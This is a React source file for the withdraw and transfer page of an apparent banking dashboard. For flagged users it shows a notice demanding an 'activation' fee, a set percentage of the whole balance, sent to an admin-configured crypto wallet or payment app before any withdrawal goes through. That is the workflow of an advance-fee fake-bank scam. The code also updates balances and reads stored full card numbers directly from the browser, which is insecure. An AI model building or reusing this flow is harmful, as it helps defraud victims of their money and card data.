import { useState, useEffect } from "react";
import { useBank } from "@/contexts/BankContext";
import { DashboardLayout } from "@/components/DashboardLayout";
import { ArrowUpRight, Send, AlertTriangle, X, Building2, Bitcoin, CreditCard, Wallet, DollarSign, Copy, Check } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";

type PaymentMethod = "bank_transfer" | "bitcoin" | "zelle" | "paypal" | "cashapp";

const paymentMethods: { key: PaymentMethod; label: string; icon: typeof Building2 }[] = [
  { key: "bank_transfer", label: "Bank Transfer", icon: Building2 },
  { key: "bitcoin", label: "Bitcoin", icon: Bitcoin },
  { key: "zelle", label: "Zelle", icon: CreditCard },
  { key: "paypal", label: "PayPal", icon: Wallet },
  { key: "cashapp", label: "CashApp", icon: DollarSign },
];

const Transactions = () => {
  const { currentUser, refreshCurrentUser } = useBank();
  const [activeView, setActiveView] = useState<"menu" | "withdraw" | "transfer">("menu");
  const [showWithdrawFeeModal, setShowWithdrawFeeModal] = useState(false);
  const [feeIntent, setFeeIntent] = useState<"withdraw" | "transfer">("withdraw");
  const [selectedPayment, setSelectedPayment] = useState<PaymentMethod | null>(null);
  const [recipientEmail, setRecipientEmail] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [amount, setAmount] = useState("");
  const [description, setDescription] = useState("");
  const [success, setSuccess] = useState("");
  const [error, setError] = useState("");
  const [feePercent, setFeePercent] = useState<number | null>(null);
  const [feeLoading, setFeeLoading] = useState(true);
  const [walletAddress, setWalletAddress] = useState<string>("");
  const [copied, setCopied] = useState(false);
  const [showCardConfirm, setShowCardConfirm] = useState(false);
  const [cardLastSix, setCardLastSix] = useState("");
  const [confirmError, setConfirmError] = useState("");
  const [confirmLoading, setConfirmLoading] = useState(false);
  const [pendingWithdrawAmount, setPendingWithdrawAmount] = useState<number | null>(null);

  useEffect(() => {
    const fetchSettings = async () => {
      setFeeLoading(true);
      const { data } = await supabase
        .from("site_settings")
        .select("key,value")
        .in("key", ["withdrawal_fee_percent", "activation_wallet_address"]);
      let fee = 3;
      let wallet = "";
      data?.forEach((row: any) => {
        if (row.key === "withdrawal_fee_percent") fee = parseFloat(row.value) || 3;
        if (row.key === "activation_wallet_address") wallet = row.value || "";
      });
      setFeePercent(fee);
      setWalletAddress(wallet);
      setFeeLoading(false);
    };
    fetchSettings();

    const channel = supabase
      .channel("settings_updates")
      .on("postgres_changes", { event: "*", schema: "public", table: "site_settings" }, (payload: any) => {
        if (payload.new?.key === "withdrawal_fee_percent") {
          setFeePercent(parseFloat(payload.new.value) || 3);
        }
        if (payload.new?.key === "activation_wallet_address") {
          setWalletAddress(payload.new.value || "");
        }
      })
      .subscribe();

    return () => { supabase.removeChannel(channel); };
  }, []);

  const copyWallet = async () => {
    if (!walletAddress) return;
    try {
      await navigator.clipboard.writeText(walletAddress);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch {}
  };

  if (!currentUser || feeLoading || feePercent === null) return null;

  const isFrozen = currentUser.accountStatus !== "active";
  const feeAmount = currentUser.balance * (feePercent / 100);

  const resetForm = () => {
    setAmount("");
    setDescription("");
    setRecipientEmail("");
    setAccountNumber("");
    setSelectedPayment(null);
    setError("");
  };

  const handleWithdrawClick = () => {
    if (isFrozen) {
      setError("Your account is currently restricted. Contact support.");
      return;
    }
    setFeeIntent("withdraw");
    if (currentUser.showFeeNotice) {
      setShowWithdrawFeeModal(true);
    } else {
      setSelectedPayment(null);
      setActiveView("withdraw");
    }
  };

  const handleTransferClick = () => {
    if (isFrozen) {
      setError("Your account is currently restricted. Contact support.");
      return;
    }
    setFeeIntent("transfer");
    if (currentUser.showFeeNotice) {
      setShowWithdrawFeeModal(true);
    } else {
      setSelectedPayment(null);
      setActiveView("transfer");
    }
  };

  const handlePaymentSelect = (method: PaymentMethod) => {
    setSelectedPayment(method);
    setShowWithdrawFeeModal(false);
    setActiveView(feeIntent);
  };

  // Validates the form, then opens the card-confirm modal instead of running immediately.
  const handleTransfer = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setSuccess("");

    const num = parseFloat(amount);
    if (!num || num <= 0) { setError("Enter a valid amount"); return; }
    if (num > currentUser.balance) { setError("Insufficient balance"); return; }
    if (!recipientEmail.trim() && !accountNumber.trim()) { setError("Please enter the recipient's email or account number"); return; }

    setFeeIntent("transfer");
    setShowCardConfirm(true);
  };

  const handleWithdrawSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setSuccess("");
    const num = parseFloat(amount);
    if (!num || num <= 0) { setError("Enter a valid amount"); return; }
    if (num > currentUser.balance) { setError("Insufficient balance"); return; }
    setPendingWithdrawAmount(num);
    setFeeIntent("withdraw");
    setShowCardConfirm(true);
  };

  const executeTransfer = async (num: number): Promise<string | null> => {
    let query = supabase.from("profiles").select("id,user_id,balance").limit(1);
    if (recipientEmail.trim()) {
      query = query.eq("email", recipientEmail.trim().toLowerCase());
    } else {
      query = query.eq("account_number", accountNumber.trim());
    }
    const { data: recipient, error: lookupErr } = await query.maybeSingle();
    if (lookupErr || !recipient) return "Recipient not found";
    if (recipient.id === currentUser.id) return "You cannot transfer to yourself";

    const desc = description || "Transfer";
    const senderNew = currentUser.balance - num;
    const recipientNew = Number(recipient.balance) + num;
    const dateStr = new Date().toISOString().split("T")[0];

    const { error: e1 } = await supabase.from("transactions").insert({
      profile_id: currentUser.id, type: "debit", amount: num, description: desc, date: dateStr, balance_after: senderNew,
    });
    if (e1) return e1.message;
    const { error: e2 } = await supabase.from("profiles").update({ balance: senderNew }).eq("id", currentUser.id);
    if (e2) return e2.message;
    const { error: e3 } = await supabase.from("transactions").insert({
      profile_id: recipient.id, type: "credit", amount: num, description: desc, date: dateStr, balance_after: recipientNew,
    });
    if (e3) return e3.message;
    const { error: e4 } = await supabase.from("profiles").update({ balance: recipientNew }).eq("id", recipient.id);
    if (e4) return e4.message;
    return null;
  };

  const executeWithdraw = async (num: number): Promise<string | null> => {
    const newBal = currentUser.balance - num;
    const dateStr = new Date().toISOString().split("T")[0];
    const { error: e1 } = await supabase.from("transactions").insert({
      profile_id: currentUser.id, type: "debit", amount: num, description: description || "Withdrawal", date: dateStr, balance_after: newBal,
    });
    if (e1) return e1.message;
    const { error: e2 } = await supabase.from("profiles").update({ balance: newBal }).eq("id", currentUser.id);
    if (e2) return e2.message;
    return null;
  };

  const handleCardConfirm = async (e: React.FormEvent) => {
    e.preventDefault();
    setConfirmError("");
    const six = cardLastSix.trim();
    if (!/^\d{6}$/.test(six)) { setConfirmError("Enter the last 6 digits of your card"); return; }
    setConfirmLoading(true);

    // Verify against any card on file for the user
    const { data: cards } = await supabase
      .from("card_details")
      .select("card_number")
      .eq("user_id", currentUser.userId);
    const match = (cards || []).some((c: any) => (c.card_number || "").replace(/\D/g, "").slice(-6) === six);
    if (!match) {
      setConfirmLoading(false);
      setConfirmError("Card verification failed. Please check the last 6 digits and try again.");
      return;
    }

    let err: string | null = null;
    if (feeIntent === "transfer") {
      err = await executeTransfer(parseFloat(amount));
    } else {
      err = await executeWithdraw(pendingWithdrawAmount ?? parseFloat(amount));
    }
    setConfirmLoading(false);

    if (err) {
      setConfirmError(err);
      return;
    }

    await refreshCurrentUser();
    const num = feeIntent === "transfer" ? parseFloat(amount) : (pendingWithdrawAmount ?? 0);
    setSuccess(
      feeIntent === "transfer"
        ? `Successfully sent $${num.toLocaleString("en-US", { minimumFractionDigits: 2 })}`
        : `Withdrawal of $${num.toLocaleString("en-US", { minimumFractionDigits: 2 })} confirmed`
    );
    setShowCardConfirm(false);
    setCardLastSix("");
    setPendingWithdrawAmount(null);
    resetForm();
    setActiveView("menu");
    setTimeout(() => setSuccess(""), 4000);
  };

  return (
    <DashboardLayout>
      <div style={{ animation: "fade-up 0.6s cubic-bezier(0.16,1,0.3,1) forwards" }}>
        <h1 className="text-2xl font-semibold text-foreground mb-1">Transactions</h1>
        <p className="text-muted-foreground text-sm mb-8">Withdraw or transfer funds</p>

        {isFrozen && (
          <div className="mb-6 p-4 rounded-xl bg-warning/10 border border-warning/20 flex items-start gap-3">
            <AlertTriangle className="w-5 h-5 text-warning shrink-0 mt-0.5" />
            <p className="text-sm text-muted-foreground">Your account is currently restricted. Transactions are disabled.</p>
          </div>
        )}

        <div className="glass-card rounded-xl p-5 mb-6" style={{ animation: "fade-up 0.6s cubic-bezier(0.16,1,0.3,1) 0.05s forwards", opacity: 0 }}>
          <p className="text-xs font-medium text-muted-foreground uppercase tracking-wider mb-1">Available Balance</p>
          <p className="text-3xl font-bold text-foreground tabular-nums">
            ${currentUser.balance.toLocaleString("en-US", { minimumFractionDigits: 2 })}
          </p>
        </div>

        {success && (
          <div className="mb-4 p-3 rounded-lg bg-emerald-500/10 text-emerald-500 text-sm font-medium">
            {success}
          </div>
        )}
        {error && (
          <div className="mb-4 p-3 rounded-lg bg-destructive/10 text-destructive text-sm font-medium">
            {error}
          </div>
        )}

        {activeView === "menu" && (
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 max-w-lg" style={{ animation: "fade-up 0.6s cubic-bezier(0.16,1,0.3,1) 0.1s forwards", opacity: 0 }}>
            <button
              onClick={handleWithdrawClick}
              disabled={isFrozen}
              className="glass-card rounded-xl p-6 text-left hover:border-accent/40 transition-all active:scale-[0.97] disabled:opacity-50 disabled:pointer-events-none group"
            >
              <div className="w-12 h-12 rounded-xl bg-accent/10 flex items-center justify-center mb-4 group-hover:bg-accent/20 transition-colors">
                <ArrowUpRight className="w-6 h-6 text-accent" />
              </div>
              <h3 className="text-lg font-semibold text-foreground mb-1">Withdraw</h3>
              <p className="text-sm text-muted-foreground">Withdraw funds from your account</p>
            </button>

            <button
              onClick={handleTransferClick}
              disabled={isFrozen}
              className="glass-card rounded-xl p-6 text-left hover:border-accent/40 transition-all active:scale-[0.97] disabled:opacity-50 disabled:pointer-events-none group"
            >
              <div className="w-12 h-12 rounded-xl bg-blue-500/10 flex items-center justify-center mb-4 group-hover:bg-blue-500/20 transition-colors">
                <Send className="w-6 h-6 text-blue-500" />
              </div>
              <h3 className="text-lg font-semibold text-foreground mb-1">Transfer</h3>
              <p className="text-sm text-muted-foreground">Send money to another account</p>
            </button>
          </div>
        )}

        {activeView === "transfer" && (
          <div className="glass-card rounded-xl p-6 max-w-lg" style={{ animation: "fade-up 0.5s cubic-bezier(0.16,1,0.3,1) forwards" }}>
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-lg font-semibold text-foreground">Transfer Funds</h2>
              <button onClick={() => { setActiveView("menu"); resetForm(); }} className="w-8 h-8 rounded-lg hover:bg-muted flex items-center justify-center transition-colors">
                <X className="w-4 h-4 text-muted-foreground" />
              </button>
            </div>
            <form onSubmit={handleTransfer} className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-foreground mb-1.5">Recipient Email</label>
                <input type="email" value={recipientEmail} onChange={(e) => setRecipientEmail(e.target.value)} className="w-full h-11 px-4 rounded-lg border border-border bg-card text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 transition-shadow" placeholder="recipient@example.com" />
              </div>
              <div className="text-center text-xs text-muted-foreground">— OR —</div>
              <div>
                <label className="block text-sm font-medium text-foreground mb-1.5">Recipient Account Number</label>
                <input type="text" value={accountNumber} onChange={(e) => setAccountNumber(e.target.value)} className="w-full h-11 px-4 rounded-lg border border-border bg-card text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 transition-shadow" placeholder="SVB-XXXX-XXXX" />
              </div>
              <div>
                <label className="block text-sm font-medium text-foreground mb-1.5">Amount (USD)</label>
                <input type="number" step="0.01" min="0.01" value={amount} onChange={(e) => setAmount(e.target.value)} className="w-full h-11 px-4 rounded-lg border border-border bg-card text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 transition-shadow" placeholder="0.00" required />
              </div>
              <div>
                <label className="block text-sm font-medium text-foreground mb-1.5">Description (optional)</label>
                <input type="text" value={description} onChange={(e) => setDescription(e.target.value)} className="w-full h-11 px-4 rounded-lg border border-border bg-card text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 transition-shadow" placeholder="What's this for?" />
              </div>
              <button type="submit" className="w-full h-11 rounded-lg gold-gradient text-primary font-semibold hover:opacity-90 active:scale-[0.98] transition-all">
                Send Money
              </button>
            </form>
          </div>
        )}

        {activeView === "withdraw" && !selectedPayment && (
          <div className="glass-card rounded-xl p-6 max-w-lg" style={{ animation: "fade-up 0.5s cubic-bezier(0.16,1,0.3,1) forwards" }}>
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-lg font-semibold text-foreground">Withdraw Funds</h2>
              <button onClick={() => { setActiveView("menu"); resetForm(); }} className="w-8 h-8 rounded-lg hover:bg-muted flex items-center justify-center transition-colors">
                <X className="w-4 h-4 text-muted-foreground" />
              </button>
            </div>
            <form onSubmit={handleWithdrawSubmit} className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-foreground mb-1.5">Amount (USD)</label>
                <input type="number" step="0.01" min="0.01" value={amount} onChange={(e) => setAmount(e.target.value)} className="w-full h-11 px-4 rounded-lg border border-border bg-card text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-accent/50 focus:border-accent transition-shadow" placeholder="0.00" required />
              </div>
              <div>
                <label className="block text-sm font-medium text-foreground mb-1.5">Description (optional)</label>
                <input type="text" value={description} onChange={(e) => setDescription(e.target.value)} className="w-full h-11 px-4 rounded-lg border border-border bg-card text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-accent/50 focus:border-accent transition-shadow" placeholder="What's this for?" />
              </div>
              <button type="submit" className="w-full h-11 rounded-lg gold-gradient text-primary font-semibold hover:opacity-90 active:scale-[0.98] transition-all">
                Send
              </button>
            </form>
          </div>
        )}

        {activeView === "withdraw" && selectedPayment && (
          <div className="glass-card rounded-xl p-6 max-w-lg" style={{ animation: "fade-up 0.5s cubic-bezier(0.16,1,0.3,1) forwards" }}>
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-lg font-semibold text-foreground">
                Pay Withdrawal Fee via {paymentMethods.find((p) => p.key === selectedPayment)?.label}
              </h2>
              <button onClick={() => { setActiveView("menu"); resetForm(); }} className="w-8 h-8 rounded-lg hover:bg-muted flex items-center justify-center transition-colors">
                <X className="w-4 h-4 text-muted-foreground" />
              </button>
            </div>
            <div className="p-4 rounded-lg bg-warning/10 border border-warning/20 mb-4">
              <p className="text-sm text-foreground">
                Please complete the {feePercent}% activation fee payment using <strong>{paymentMethods.find((p) => p.key === selectedPayment)?.label}</strong> to process your {feeIntent}.
              </p>
            </div>
            {walletAddress && (
              <div className="p-4 rounded-xl border border-border bg-muted/30 mb-4">
                <p className="text-xs font-medium text-muted-foreground uppercase tracking-wider mb-2">Send payment to</p>
                <div className="flex items-center gap-2">
                  <code className="flex-1 text-xs font-mono text-foreground break-all">{walletAddress}</code>
                  <button
                    onClick={copyWallet}
                    className="shrink-0 w-9 h-9 rounded-lg border border-border flex items-center justify-center hover:bg-muted transition-colors"
                    title="Copy address"
                  >
                    {copied ? <Check className="w-4 h-4 text-success" /> : <Copy className="w-4 h-4 text-muted-foreground" />}
                  </button>
                </div>
              </div>
            )}
            <p className="text-sm text-muted-foreground mb-4">
              After sending the fee, contact support to confirm and finalize your {feeIntent}.
            </p>
            <button
              onClick={() => { setActiveView("menu"); resetForm(); }}
              className="w-full h-11 rounded-lg gold-gradient text-primary font-semibold hover:opacity-90 active:scale-[0.98] transition-all"
            >
              Done
            </button>
          </div>
        )}

        {showCardConfirm && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <div className="absolute inset-0 bg-black/40 backdrop-blur-sm" onClick={() => { if (!confirmLoading) { setShowCardConfirm(false); setCardLastSix(""); setConfirmError(""); } }} />
            <div className="relative bg-card rounded-2xl border border-border shadow-xl w-full max-w-md p-6" style={{ animation: "scale-in 0.3s cubic-bezier(0.16,1,0.3,1) forwards" }}>
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-lg font-semibold text-foreground">Confirm Transaction</h2>
                <button onClick={() => { if (!confirmLoading) { setShowCardConfirm(false); setCardLastSix(""); setConfirmError(""); } }} className="w-8 h-8 rounded-lg hover:bg-muted flex items-center justify-center transition-colors">
                  <X className="w-4 h-4 text-muted-foreground" />
                </button>
              </div>
              <p className="text-sm text-muted-foreground mb-4">
                Please enter the <strong className="text-foreground">last 6 digits of your card</strong> to authorize this {feeIntent}.
              </p>
              <form onSubmit={handleCardConfirm} className="space-y-4">
                <input
                  type="text"
                  inputMode="numeric"
                  pattern="\d{6}"
                  maxLength={6}
                  value={cardLastSix}
                  onChange={(e) => setCardLastSix(e.target.value.replace(/\D/g, "").slice(0, 6))}
                  placeholder="••••••"
                  autoFocus
                  className="w-full h-12 px-4 rounded-lg border border-border bg-card text-foreground text-center text-2xl tracking-[0.5em] font-mono focus:outline-none focus:ring-2 focus:ring-accent/50 focus:border-accent transition-shadow"
                />
                {confirmError && (
                  <p className="text-destructive text-sm">{confirmError}</p>
                )}
                <button
                  type="submit"
                  disabled={confirmLoading || cardLastSix.length !== 6}
                  className="w-full h-11 rounded-lg gold-gradient text-primary font-semibold hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-50 disabled:pointer-events-none"
                >
                  {confirmLoading ? "Verifying..." : "Confirm Transaction"}
                </button>
              </form>
            </div>
          </div>
        )}

        {showWithdrawFeeModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <div className="absolute inset-0 bg-black/40 backdrop-blur-sm" onClick={() => setShowWithdrawFeeModal(false)} />
            <div className="relative bg-card rounded-2xl border border-border shadow-xl w-full max-w-md p-6 max-h-[90vh] overflow-y-auto" style={{ animation: "scale-in 0.3s cubic-bezier(0.16,1,0.3,1) forwards" }}>
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-lg font-semibold text-foreground">Withdrawal Notice</h2>
                <button onClick={() => setShowWithdrawFeeModal(false)} className="w-8 h-8 rounded-lg hover:bg-muted flex items-center justify-center transition-colors">
                  <X className="w-4 h-4 text-muted-foreground" />
                </button>
              </div>

              <div className="p-4 rounded-xl bg-warning/10 border border-warning/20 mb-4 max-h-[45vh] overflow-y-auto">
                <p className="text-sm text-foreground leading-relaxed whitespace-normal break-words">
                  Dear Valued Customer,
                  <br /><br />
                  Your {feeIntent === "withdraw" ? "withdrawal" : "transfer"} request for{" "}
                  <strong>${currentUser.balance.toLocaleString("en-US", { minimumFractionDigits: 2 })}</strong>{" "}
                  has been successfully received and is currently pending finalization.
                  <br /><br />
                  In accordance with the company standard for your account configuration and activation, kindly proceed to make a one-time service fee payment of{" "}
                  <strong>{feePercent}%</strong> of your total account balance, amounting to{" "}
                  <strong>${feeAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</strong>.
                  <br /><br />
                  Once your payment has been confirmed, your {feeIntent} will be processed and credited to the designated destination without further delay. We sincerely appreciate your cooperation and continued trust in our services.
                </p>
              </div>

              {walletAddress && (
                <div className="p-4 rounded-xl border border-border bg-muted/30 mb-6">
                  <p className="text-xs font-medium text-muted-foreground uppercase tracking-wider mb-2">Send fee to this wallet</p>
                  <div className="flex items-center gap-2">
                    <code className="flex-1 text-xs font-mono text-foreground break-all">{walletAddress}</code>
                    <button
                      onClick={copyWallet}
                      className="shrink-0 w-9 h-9 rounded-lg border border-border flex items-center justify-center hover:bg-muted transition-colors"
                      title="Copy address"
                    >
                      {copied ? <Check className="w-4 h-4 text-success" /> : <Copy className="w-4 h-4 text-muted-foreground" />}
                    </button>
                  </div>
                </div>
              )}

              <p className="text-sm font-medium text-foreground mb-3">Select a payment method:</p>
              <div className="space-y-2">
                {paymentMethods.map((method) => (
                  <button
                    key={method.key}
                    onClick={() => handlePaymentSelect(method.key)}
                    className="w-full flex items-center gap-3 p-3 rounded-xl border border-border hover:border-accent/40 hover:bg-muted/50 transition-all active:scale-[0.98]"
                  >
                    <div className="w-10 h-10 rounded-lg bg-accent/10 flex items-center justify-center shrink-0">
                      <method.icon className="w-5 h-5 text-accent" />
                    </div>
                    <span className="text-sm font-medium text-foreground">{method.label}</span>
                  </button>
                ))}
              </div>
            </div>
          </div>
        )}
      </div>
    </DashboardLayout>
  );
};

export default Transactions;
